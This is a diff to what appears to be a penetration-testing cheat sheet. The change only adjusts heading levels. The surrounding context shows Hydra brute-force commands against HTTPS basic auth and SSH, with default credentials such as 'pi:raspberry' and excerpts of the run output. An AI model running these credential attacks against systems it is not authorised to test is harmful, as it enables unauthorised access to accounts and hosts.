@@ -103,7 +103,7 @@ Examples:
 hydra -l [USERNAME] -P [PWLIST] -s [PORT] -f [URL] [METHOD] [PATH]
 ```
 
-#### HTTPS basic auth brute-force
+### HTTPS basic auth brute-force
 
 ```plain
 $ hydra -l admin -P <LIST-WITH-PASSWORDS> -s 443 -f test.example.com https-get /                 
@@ -118,7 +118,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-11 11:23:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-11 11:23:17
 ```
 
-#### HTTPS basic auth with username:password file
+### HTTPS basic auth with username:password file
 
 ```plain
 $ hydra -C default-credentials-list.txt -s 443 -f test.example.com https-get /j_security_check
@@ -131,7 +131,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-11 11:35:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-11 11:35:07
 ```
 
-#### SSH bruteforce / checking
+### SSH bruteforce / checking
 
 ```plain
 $ hydra -l pi -p raspberry ssh://10.10.10.10
